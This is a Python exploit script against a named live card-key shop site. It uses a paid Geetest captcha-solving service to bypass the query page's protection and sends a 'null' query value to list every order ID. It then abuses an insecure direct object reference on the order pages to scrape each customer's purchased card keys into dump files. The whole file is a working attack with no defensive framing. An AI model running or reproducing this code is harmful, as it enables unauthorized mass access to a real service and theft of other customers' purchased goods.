#!/usr/bin/env python3
"""fak86.top YKFAKA: value=null requires Geetest; then Query_Km IDOR."""
from __future__ import annotations

import json
import re
import sys
import time
from html import unescape
from pathlib import Path

import requests

sys.path.insert(0, str(Path(__file__).resolve().parent))
from geetest_2captcha import get_balance, solve_geetest_v3

BASE = "http://fak86.top"
PAGE = f"{BASE}/Query.html"
UA = {
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    ),
    "Accept-Language": "zh-CN,zh;q=0.9",
}


def fresh_captcha(s: requests.Session) -> tuple[str, dict]:
    for _ in range(12):
        r = s.get(PAGE, timeout=20)
        tok = re.search(
            r'name=["\']__token__["\'][^>]*value=["\']([^"\']*)["\']', r.text, re.I
        ).group(1)
        cap = s.get(f"{BASE}/Captcha?t={int(time.time() * 1000)}", timeout=20).json()
        if cap.get("success") == 1:
            return tok, cap
        time.sleep(0.4)
    raise RuntimeError("no success captcha")


def solve(s: requests.Session) -> tuple[str, dict]:
    for attempt in range(5):
        tok, cap = fresh_captcha(s)
        try:
            sol = solve_geetest_v3(
                gt=cap["gt"], challenge=cap["challenge"], pageurl=PAGE, timeout=150
            )
            return tok, sol
        except Exception as e:
            print("solve fail", attempt, e)
            time.sleep(1)
    raise RuntimeError("geetest solve failed")


def null_list(s: requests.Session, page: int = 1) -> str:
    tok, sol = solve(s)
    data = {
        "value": "null",
        "page": str(page),
        "__token__": tok,
        "geetest_challenge": sol["geetest_challenge"],
        "geetest_validate": sol["geetest_validate"],
        "geetest_seccode": sol["geetest_seccode"],
    }
    r = s.post(PAGE, data=data, headers={"Referer": PAGE, "Origin": BASE}, timeout=60)
    return r.text


def main() -> None:
    out = Path(__file__).resolve().parents[1] / "results" / "dump"
    out.mkdir(parents=True, exist_ok=True)
    (out / "km_pages").mkdir(exist_ok=True)
    print("balance", get_balance())
    s = requests.Session()
    s.headers.update(UA)

    html = null_list(s, 1)
    if "验证码" in html and len(html) < 3000:
        html = null_list(s, 1)
    (out / "null_page1.html").write_text(html, encoding="utf-8", errors="ignore")
    ddids = sorted(
        {
            x.upper()
            for x in re.findall(
                r"(?:Query_Km/|订单编号:[\s\S]{0,80}?)([0-9A-Fa-f]{12})", html
            )
        }
    )
    (out / "ddids_all.txt").write_text("\n".join(ddids) + "\n", encoding="utf-8")
    print("ddids", len(ddids))

    final: list[str] = []
    cards: list[dict] = []
    for i, ddid in enumerate(ddids):
        r = s.get(
            f"{BASE}/Query_Km/{ddid}", headers={"Referer": PAGE}, timeout=25
        )
        (out / "km_pages" / f"{ddid}.html").write_text(
            r.text, encoding="utf-8", errors="ignore"
        )
        tgts = re.findall(
            r'<textarea[^>]*id=["\']target["\'][^>]*>([\s\S]*?)</textarea>',
            r.text,
            re.I,
        )
        text = "\n".join(
            re.sub(r"<[^>]+>", "", unescape(x)).replace("<br>", "").strip()
            for x in tgts
        ).strip()
        cards.append({"ddid": ddid, "target": text, "len": len(r.text)})
        if text:
            for line in text.splitlines():
                line = line.strip()
                if line:
                    final.append(f"{ddid}\t{line}")
            print(i + 1, ddid, "HIT", text[:60])
        time.sleep(0.12)

    seen: set[str] = set()
    uniq: list[str] = []
    for line in final:
        k = line.split("\t", 1)[1]
        if k in seen:
            continue
        seen.add(k)
        uniq.append(line)

    (out / "cards_full.jsonl").write_text(
        "\n".join(json.dumps(c, ensure_ascii=False) for c in cards) + "\n",
        encoding="utf-8",
    )
    (out / "cards_kami_clean.tsv").write_text("\n".join(uniq) + "\n", encoding="utf-8")
    stats = {
        "ddids": len(ddids),
        "with_target": sum(1 for c in cards if c["target"]),
        "unique_kami": len(uniq),
        "ts": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
    }
    (out / "STATS.json").write_text(
        json.dumps(stats, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    print(stats)


if __name__ == "__main__":
    main()
